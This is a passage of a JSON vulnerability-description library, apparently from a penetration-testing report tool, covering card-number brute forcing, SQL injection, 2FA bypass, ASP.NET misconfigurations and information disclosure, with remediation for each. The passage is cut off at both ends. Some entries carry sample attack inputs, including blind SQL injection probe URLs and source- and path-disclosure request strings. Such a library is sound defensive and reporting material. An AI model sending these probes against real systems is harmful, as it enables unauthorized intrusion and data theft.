prediction.\n","poc":null,"impact":"There is no anti-automation while creating a virtual credit card. An attacker can use automated scripts to exhaust credit card numbers. As a result, Credit Card Numbers can be exhausted and be therefore made unavailable to users leading to a Denial of Service (DoS) attack. It can also lead to other attacks including Credit Card Number pattern prediction.\n","remediation":"There should be sufficient anti-automation e.g. CAPTCHA while creating virtual credit card numbers\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":461,"plugin_id":null,"title":"No anti-automation in virtual credit card details verification","type":null,"description":"There is no anti-automation (e.g. CAPTCHA) while verifying the Virtual Credit Card details such as CVV number and expiry date. The Credit Card number is sufficiently long however, the CVV number is generally a 3 digit number and expiry date is also a 2 digit number. As a result, it is possible to brute force the CVV number and expiry date, and shop online using a stolen virtual credit card number.\n","poc":null,"impact":"There is no anti-automation (e.g. CAPTCHA) while verifying the Virtual Credit Card details such as CVV number and expiry date. The Credit Card number is sufficiently long however, the CVV number is generally a 3 digit number and expiry date is also a 2 digit number. As a result, it is possible to brute force the CVV number and expiry date, and shop online using a stolen virtual credit card number.\n","remediation":"There should be sufficient anti-automation e.g. CAPTCHA while verifying the CVV numbers along with the Credit Card Number\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":462,"plugin_id":null,"title":"Tampering of data communication between payment gateway and banking application","type":null,"description":"The Banking application does not verify whether the required amount is successfully paid at the Payment Gateway Side, or what amount is being paid at the Payment Gateway Side. As a result, a virtual card can be recharged with higher amount while paying a lower amount to the bank by modifying amount when the request is sent from payment gateway to the bank.\n","poc":null,"impact":"The Banking application does not verify whether the required amount is successfully paid at the Payment Gateway Side, or what amount is being paid at the Payment Gateway Side. As a result, a virtual card can be recharged with higher amount while paying a lower amount to the bank by modifying amount when the request is sent from payment gateway to the bank.\n","remediation":"There should be sufficient validations between the Banking application and the payment gateway. The callback URL should not be allowed to be directly controlled by an attacker\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":468,"plugin_id":null,"title":"Virtual credit card number is predictable","type":null,"description":"Generated Virtual Credit card numbers are predictable or follow certain patterns. As a result, an attacker can predict what virtual credit card numbers are being used by other legitimate users.\n","poc":null,"impact":"Generated Virtual Credit card numbers are predictable or follow certain patterns. As a result, an attacker can predict what virtual credit card numbers are being used by other legitimate users.\n","remediation":"Virtual Credit Card numbers should be sufficiently random.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":469,"plugin_id":null,"title":"VFS MAC is not enabled in VIEWSTATE","type":null,"description":"We identified that the target web application does not use MAC validation in ViewState data.ASP.NET uses a hash code based integrity solution called \"ViewStateMac\" to protect ViewState parameters against tampering attacks.\n","poc":null,"impact":"An attacker can tamper with the application's state variables located in the ViewState data structure.\n","remediation":"You can implement this solution on a page or application level. For page based protection, place the following directive at the top of affected page. <%@Page EnableViewStateMAC=true %> You can also set this option for the whole application by using web.config files. Apply the following configuration for your application's web.config file.\nAdd the following line to your Web.Config file, under the <system.web> element:\n<pre><code class=\"xml\"><machineKey validation=\"AES\" /> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":470,"plugin_id":null,"title":"Password Change Does Not Require Current Password","type":null,"description":"The application's authenticated password reset mechanism does not require the user to enter their existing password to execute a password change.\n","poc":null,"impact":"Allowing the user to change their password while authenticated without requiring their current password may allow an attacker to change the victim's password and gain continued access to their account. In this design, if an attacker is able to obtain the victim's session identifier or gain access to the victim's system while authenticated, the attacker can change the victim's password without needing the victim's current password. The attacker would effectively lock out the victim and retain access to their account across multiple sessions.\n","remediation":"The application should require the user's current password to verify their identity during the change password process.\n","cvss_base_score":3.2,"cvss_temporal_score":2.8,"cvss_vector":"(AV:L/AC:L/Au:S/C:P/I:N/A:P/E:H/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":472,"plugin_id":null,"title":"Two-Factor Authentication Bypass","type":null,"description":"Two factor authentication system is to enhance the strength of the authentication process. This goal is achieved by checking an additional factor, or \"something you have\" as well as \"something you know\",making sure that the user holds a hardware device of some kind in addition to the password. The hardware device provided to the user may be able to communicate directly and independently with the authentication infrastructure using an additional communication channel.\n","poc":null,"impact":"An attacker authenticate without using two-factor authentication code.\n","remediation":"--Make sure that two-factor authentication process works properly as intended.\n--Make sure that two-factor authentication code is not reusable.\n--Make user that two-factor authentication code entropy high\n--Two-factor code should not sequential\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":473,"plugin_id":null,"title":"Weak Password Recovery Mechanism for Forgotten Password","type":null,"description":"During our assessment we found that \"Forgot Password\" functionality sends existing username and password in clear text to the user's valid email address. This also indicates that user's passwords are stored un-encrypted in the back-end database.\n","poc":null,"impact":"Any attacker can gain access to the mail of the user can directly collect username and password using this forget password option.\n","remediation":"--Do not send directly user credentials to the users mail in forget password option.\n--Implement a link with some random parameter to recover password and send the same to users email.\n--The link must expire with in a certain time if not used by the user or after first attempt.\n--The link must allow a user to add a new password.\n--The user must be forced to use a complex password.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":474,"plugin_id":null,"title":"Text Injection","type":null,"description":"Text Injection is an attack technique that allows an attacker to inject textual data into dynamical web pages that is later misrepresented as legitimate content of a web application.A common approach for dynamically build pages involves passing the body or portions thereof into the page via a query string value. This approach is common on error pages, or sites providing story or news entries. The content specified in this parameter is later reflected into the page to provide the content for the page.\n","poc":null,"impact":"This attack exploits the trust relationship established between the user and the web site. The technique has been used to create fake web page data,false press releases, etc.\n","remediation":"--Input Validation should be present.\n--Sanity checking should be present for the data provided in the parameter values.\n--Default configuration settings should be disabled or customized.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:07","updated_at":"2018-11-12 09:25:07","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":475,"plugin_id":null,"title":"Predictable Admin Panel Credentials","type":null,"description":"Application is using the same password for different user roles.  Default password which was provided to us was even working with Admin level credentials for Dashboard management of the application.\n","poc":null,"impact":"An attacker can directly get complete privileges in the application which must not happen at any cost.\n","remediation":"--Make sure no default values are used in application. As of now, username \"admin\" and password must be changed.\n--No two accounts must be using same password.\n--Default login page URL must be changed.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":476,"plugin_id":null,"title":"Guessable CAPTCHA","type":null,"description":"The previously validated Captcha can be reused and the Captcha can be bypassed as the previously validated Catpcha is not getting expired nor its getting validated on server-side.\n","poc":null,"impact":"The previously validated Captcha can be reused again and again due to which the Captcha can be bypassed.\n","remediation":"--Previously used Captcha shall be be allowed to be reused again and again.\n--The Captcha shall always be validated on server side.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":477,"plugin_id":null,"title":"Authentication Bypass via SQL-Injection","type":null,"description":"A login process containing SQL injection vulnerability can be bypassed by attackers. They need to manipulate username or password parameters and thus access to the application (even as administrator) without knowing the original user credentials.\n","poc":null,"impact":"An attacker can access protected areas of the application bypassing the authentication schema exploiting a SQL-Injection vulnerability.\n","remediation":"--Specifically, make sure the value and type (such as Integer, Date, etc.) of the user input is valid and expected by the application.\n--Sanitize input to exclude context-changing symbols such as:\n\n[1] ' (single apostrophe)\n[2] ; (quotation mark)\n[3] \\' (backslash-escaped apostrophe)\n[4] \\; (backslash-escaped quotation mark)\n[5] ) (closing parenthesis)\n[6] ; (semicolon)</li> <li>Validate data both on the client and the server because client validation is extremely easy to circumvent.</li> <li>Constrain the input by validating it for type, length, format and range. Remember, ALL INPUT IS EVIL, until proven otherwise!</li> <li>Use type safe SQL parameters. The parameter collection in SQL provides type checking and length validation. So if you use the Parameters collection, input is treated as a literal value and SQL does not treat it as executable code. You can use the Parameters collection with both stored procedures as well as dynamic SQL.</li> <li>Avoid use of dynamically generated SQL in your code. By using parameterized queries and stored procedures, you then make it impossible for SQL injection to occur against your application.</li> <li>Stored procedures can secure your database by restricting objects within the database to specific accounts, and permitting the accounts to just execute stored procedures.</li> <li>Use filter routines that sanitize the code by adding escape characters to characters that have special meaning to SQL.</li> </ul><p>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":478,"plugin_id":null,"title":"Blind SQL Injection","type":null,"description":"The application executes SQL queries generated by dynamically concatenating user-supplied data to static SQL query strings. Additionally, the application provides no feedback to the user when the query has been altered by user input, intentionally or otherwise. In this design, the database has no way of distinguishing SQL syntax from valid data inserted into the query, and any SQL syntax inserted will be interpreted and executed. This leaves the application vulnerable to blind SQL injection since an attacker can inject SQL query syntax that intentionally alters the target query's structure.\nThis issue differs slightly from standard SQL injection since the application does not reflect database errors or data directly back to the user. This forces the attacker to use passive probing techniques to discover if the application is vulnerable, based on how the application responds to SQL syntax that should have an intended effect.\nTwo of the most common probing techniques involve sending time-based and conditional SQL statements to the application. Time-based detection involves using wait commands to delay the SQL statement's execution. Consider the following URL, which returns data based on a supplied username:\n<pre>http://www.site.com/index.php?user=jsmith </pre>\nFor Microsoft SQL server, if the following modified request waits for 15 seconds before returning, the application may be vulnerable to blind SQL injection:\n<pre>http://www.site.com/vulnerable.php?id=1'%20waitfor%20delay%20'00:00:15'-- </pre>\nConditional SQL statements, on the other hand, return different results based on how the query is evaluated rather than forcing the database server to wait for a set amount of time. Constructing conditional SQL statements involves two steps, using SQL boolean operators to force the SQL query to return either a \"true\" or \"false\" result.\nFor example, if an attacker were to use \"jsmith' AND 1=1\" as input to an injection point, the SQL statement will evaluate to true since 1 equals 1, and the expected response would be returned:\n<pre>http://www.site.com/index.php?user=jsmith'%20AND%201%3D1 </pre>\nAn attacker would then use a similar payload such as \"jsmith' AND 1=2\", knowing that the full statement will evaluate to false:\n<pre>http://www.site.com/index.php?user=jsmith'%20AND%201%3D2 </pre>\nIf the application's response varies, this indicates the presence of a blind SQL injection vulnerability.\n","poc":null,"impact":"SQL injection allows an attacker to modify the structure of a SQL query executed by the application. Depending on the type of SQL server in use, the attacker may be able to modify existing queries or append entirely new queries to the existing query. The modified query can access any portion of the database with the same entitlements that the database connection is granted, potentially leading to:\n--Loss of confidentiality when an attacker gains access to unauthorized information\n--Loss of integrity through modification of other users' information, log files, and any other sensitive information\n--Loss of availability when an attacker deletes other users' data, executes commands that take down the database server, or performs a denial of service attack that fills the database and subsequently exhausts the database server's storage\n--Authentication bypass through modification of SQL queries that verify a user's credentials\n--Authorization bypass from gaining access to or altering data in ways the application's business logic does not allow\n\n","remediation":"Rewrite all SQL queries constructed through dynamic concatenation to use an injection-safe query mechanism such as prepared statements with parameterized queries. Most modern programming languages provide a feature called \"parameterized queries\" that allow user-supplied data to be inserted safely as values in dynamic SQL queries. Rather than construct the dynamic SQL query by concatenating user-supplied data to static SQL query string fragments, data values are identified in the query by parameter markers or variables. Dynamic data is then passed through a mechanism provided by SQL that prevents the supplied data from changing the meaning of the query.\nNote: the exact syntax and use of prepared statements with parameterized queries varies from language to language. The following links provide general guidance for secure SQL query construction in .NET, Java, and PHP:\nhttps://msdn.microsoft.com/en-us/library/bb738521(v=vs.100).aspx\nhttps://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html\nhttp://php.net/manual/en/mysqli.prepare.php\n","cvss_base_score":6.1,"cvss_temporal_score":5.1,"cvss_vector":"(AV:N/AC:H/Au:S/C:C/I:P/A:P/E:F/RL:OF/RC:C/CDP:H/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"High","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":479,"plugin_id":null,"title":"IBM WebSphere Commerce Suite (WCS) Source Code Disclosure","type":null,"description":"The IBM WebSphere Commerce Server responds with the source file of the JSP requested, if a single slash (\"/\") is appended to the JSP file name. This source disclosure may reveal passwords and other sensitive information. Sample Exploit:\n<pre>GET /servletname.jsp/ HTTP/1.0 </pre>\nwill reveal the servlet source.\n","poc":null,"impact":"It may be possible to retrieve the source code of server-side scripts, which may expose the application logic and other sensitive information such as usernames and passwords\n","remediation":"A fix has been made available at http://www.ibm.com/software/webservers/appserv/support.html . Alternatively, consider upgrading to version 5.1 or above.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":480,"plugin_id":null,"title":"CVV input is not taken in password field","type":null,"description":"During our assessment we found that the target application accepts input for Credit card CVV number in a simple textbox making it susceptible to shoulder surfing.\n","poc":null,"impact":"During our assessment we found that the target application accepts input for Credit card CVV number in a simple textbox making it susceptible to shoulder surfing.\n","remediation":"Accept CVV input in a password field.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":481,"plugin_id":null,"title":"Weak Password Policy","type":null,"description":"The application does not enforce a strong password policy to prevent malicious users from manually guessing or brute-forcing legitimate account passwords. Weak password policies include those that allow passwords consisting of common dictionary words, commonly-used passwords (e.g., 1234), passwords that contain the associated username, sequential characters, and passwords shorter than 9 characters. By allowing users to create easily-guessable passwords, an attacker with minimal knowledge of registered users and username formats could crack passwords through the use of any of several techniques.\nIn an online attack, an attacker can use consecutive login attempts to determine simple passwords. In an offline attack (e.g., if the attacker has gained access to the raw contents of the password database through some other means), the attacker can employ richer techniques such as pre-computed hash attacks, free of rate-limiting and account-locking protections that might be employed against online password brute-forcing attacks.\nWeak passwords may be easily guessed.  This increases the likelihood of compromising a user's account. Once compromised, an attacker will have full access to the victim's account, potentially including the ability to modify settings, features and passwords. If the target account holds administrative privileges, the attacker may be able to modify data for other users and/or the entire system. Due to the prevalence of password reuse, a compromised password may also provide an attacker with credentials that can be used to attack other systems the victim uses the same credentials to access.","poc":"","impact":"","remediation":"Implement a strong password complexity policy. A strong password policy is one which combines rules to prevent easily-guessable passwords from being used while also ensuring that passwords contain sufficient entropy. A password policy which provides a large set of restrictions will ultimately result in a smaller potential pool of passwords, lowering the amount of time necessary to guess a password through brute-force attacks. Conversely, an overly permissive policy allows users to create easily-guessable passwords. Constraints should be put in place to prevent users from choosing easily-guessable passwords at the time of creation, specifically those that are targeted by well-known dictionary attacks. This will minimize the likelihood that an attack will be successful if an attacker attempts to guess commonly-used passwords or employs an automated dictionary attack against a particular user.\nIn the event that company policy does not stipulate password requirements, or the existing requirements are weak, consider employing the following password complexity requirements:\n-- Passwords must be at least nine (9) characters long.\n-- Passwords must contain some combination of at least three (3) of the following classes of characters: lowercase, uppercase, numeric, and \"special\" (e.g., !, @, #, $, %, ^, etc.) characters.\n-- Passwords should not be a dictionary word in any language, slang, dialect, jargon, etc.\n-- Passwords should not be based on personal information, etc.","cvss_base_score":6.9,"cvss_temporal_score":5.1,"cvss_vector":"(AV:L/AC:M/Au:N/C:C/I:C/A:C/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2019-01-14 06:41:26","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":482,"plugin_id":null,"title":"Test Account Identified","type":null,"description":"We were able to identify a test account as the accounts being provided were sequential with a default password.\n","poc":null,"impact":"Once a pair of working credentials is identified, an attacker can get another account directly to perform his attacks. Another issue with this is, if the test account are even deleted this might go un-noticed as this account was not provided. In case this happens, attacker will be able to access the application even when provided test accounts are deleted.\n","remediation":"Account numbers / names must never be sequential.\nSame password must never be used for more than one account.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":483,"plugin_id":null,"title":"Insufficient Validation of Authenticity Token","type":null,"description":"Application has a been implemented with a token which is mapped to user id. Whenever any user submit any request, it is token is verified from the server end, and if any mismatch happens, the request is considered to be invalid.\nHowever a severe issue lies in this implementation that the token is not mapped with session in any way. Due to which the application becomes vulnerable to insufficient authorization.\n","poc":null,"impact":"As a result of this vulnerability, in case attacker gets the token from any source, he will be able to submit the request on behalf of the any other user.\nAs application do not consider session while validating the request on the basis of authenticity token, an attacker can put the token of any other user while submitting the request along with the user if of that particular user. IN this way he submit various kind of requests which can even result in critical vulnerabilities like account compromise, etc.\n","remediation":"Application must validate request on the basis of token as well as session.\nPlease keep in mind that token must be used for protecting the application from CSRF, however for every request, session must be checked whether the user is having required authorization or not.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":484,"plugin_id":null,"title":"ASP.NET Misconfiguration: Missing Custom Error Page","type":null,"description":"ASP .NET applications should be configured to use custom error pages instead of the framework default page. The default error page gives detailed information about the error that occurred, and should not be used in production environments. The mode attribute of the <customErrors> tag defines whether custom or default error pages are used.  In the event of an application exception, use the <customErrors> element to configure custom, generic error messages that should be returned to the client. The default error page provides detailed information about the error that occurred, and should not be used in production environments. Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.\n","poc":null,"impact":"Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.\n","remediation":"Apply following changes on your web.config file to prevent information leakage by applying custom error pages.\n<pre><code class=\"xml\"><System.Web>      <customErrors mode=\"On\" defaultRedirect=\"~/error/GeneralError.aspx\">           <error statusCode=\"403\" redirect=\"~/error/Forbidden.aspx\" />           <error statusCode=\"404\" redirect=\"~/error/PageNotFound.aspx\" />           <error statusCode=\"500\" redirect=\"~/error/InternalError.aspx\" />      </customErrors> </System.Web> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":485,"plugin_id":null,"title":"ASP.NET Stack Trace Disclosure","type":null,"description":"We identified that the target web server is disclosing ASP.NET stack trace data in its HTTP response.Any request with a payload such as <script> placed as value of any of the parameters produces a stack trace.\nAn attacker can obtain information such as:\nASP.NET version.\nPhysical file path of Temporary ASP.NET Files\nInformation about the generated exception and possibly source code, SQL queries, etc.\nThis information can help an attacker to gain more information and to potentially focus the development of further attacks for the target system.\n","poc":null,"impact":"If an attacker probes the application by forging a request that contains parameters or parameter values other than the ones expected by the application, the application may enter an undefined state that makes it vulnerable to attack.\n","remediation":"Apply following changes on your web.config file to prevent information leakage by applying custom error pages.\n<pre><code class=\"xml\"><System.Web>      <customErrors mode=\"On\" defaultRedirect=\"~/error/GeneralError.aspx\">           <error statusCode=\"403\" redirect=\"~/error/Forbidden.aspx\" />           <error statusCode=\"404\" redirect=\"~/error/PageNotFound.aspx\" />           <error statusCode=\"500\" redirect=\"~/error/InternalError.aspx\" />      </customErrors> </System.Web> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":486,"plugin_id":null,"title":"Expression Language Injection","type":null,"description":"Expression Language Injection occurs when input data is evaluated by an Expression Language interpreter. This is an important issue and should be addressed as soon as possible.\n","poc":null,"impact":"An attacker can read server-side data such as the content of the server-side variables and some other inner configuration details.\nIt is a really dangerous vulnerability because since developers assume that their server-side code would not be read by outside, they can place some sensitive information such as passwords, connection strings, database queries, etc.  It can also be used for bypassing HttpOnly protection.\n","remediation":"Apply input validation best practises to ensure that there isn't any EL metacharacters(\"${\" and \"#{\") in the input.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":487,"plugin_id":null,"title":"Last login details are not displayed","type":null,"description":"During our assessment we found that the target application doesn't share last login details with end users.\nAs an additional security measure critical applications should display the details of your last login to ensure that you can see if someone has fraudulently accessed your accounts online.\nThe details shown are the day, date and time on which you last accessed the service. It is important that you check your last login every time you login to application.\n","poc":null,"impact":"Last login message tells you when the last login was performed.\n","remediation":"As an additional security measure the target application should display the details of your last login each time you login to the application.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":488,"plugin_id":null,"title":"IIS Host header internal ip disclosure","type":null,"description":"When a remote user attempts to access an area protected by basic authentication with no realm defined, while specifying HTTP 1.0, Microsoft IIS will return an Access Denied error message containing the internal IP address of the host. Even if IIS is behind a firewall or NAT, it will disclose the true internal IP address to the remote user.\nThe internal IP address may also be revealed through a HTTP request made with an empty host name. If a PROPFIND HTTP request is made, the message returned will include the IP address as part of the HREF header. The IP address may also be exposed through the WRITE or MKCOL methods, although they would not normally be exposed to the external network.\n","poc":null,"impact":"Successful exploitation will allow remote attackers to gain internal IP address or internal network name, which could assist in further attacks\nagainst the target host.\n","remediation":"Configure your web servers in a way so that it doesn't reveal internal IP addresses in response headers.\nVisit the two following links to get more information and available fixes of this vulnerability.\nhttp://support.microsoft.com/kb/967342\nhttp://support.microsoft.com/kb/967342\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":489,"plugin_id":null,"title":"Improper Validation of Host-specific Certificate Data","type":null,"description":"The SSL certificate contains a domain name that does not match the visited site.\nHaving a mis-configured SSL certificate has several security implications:\n--Denial of Service: users with strict security policy will not be able to browse the site\n--Phishing: It is easier for malicious sites to pretend to be the legitimate site, and to obtain users confidential information\n\n","poc":null,"impact":"It is possible to prevent the web application from serving other users (denial of service)\nIt is possible to persuade a naive user to supply sensitive information such as username, password, credit card number, social security number etc.\n","remediation":"Contact your Certificate Authority and update your SSL certificate. Make sure that all attributes such as the validation date, expiration date, common name, etc. are correct.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":490,"plugin_id":null,"title":"Drupal 6.x, 7.x Search Module – Full Path Disclosure","type":null,"description":"Full path disclosure due to insufficient input validation in the search module.\nPerforming a search with the \"keys\" parameter set as an array, an error message shows the full path of the Drupal installation, leading to possible further attacks.\nExploit PoC\n<pre>example.com/?q=search&keys[]=securitate.md </pre>\n","poc":null,"impact":"Performing a search with the \"keys\" parameter set as an array, an error message shows the full path of the Drupal installation, leading to possible further attacks.\n","remediation":"Correct input validation for the \"keys\" parameters\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:08","updated_at":"2018-11-12 09:25:08","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":491,"plugin_id":null,"title":"Database User used by Web Application has Administrator Privileges","type":null,"description":"We identified that the target web site is connecting to the backend database by using a user that has administrative privileges. This issue has been confirmed by checking the connection privileges via an identified SQL Injection vulnerability in the application.\n","poc":null,"impact":"This can allow an attacker to gain extra privileges via SQL Injection attacks. Here is the list of attacks that the attacker might carry out:\nGain full access to the database server.\nGain a reverse shell to the database server and execute commands on the underlying operating system.\nAccess the database with full permissions. Where it may be possible to read, update or delete arbitrary data from the database.\nFurthermore, depending on the platform and the database system user an attacker might carry out a privilege escalation attack to gain administrator access to the target system.\n","remediation":"Create a database user with the least possible permissions for your application and connect to the database with that user. Always follow the principle of providing the least privileges for all users and 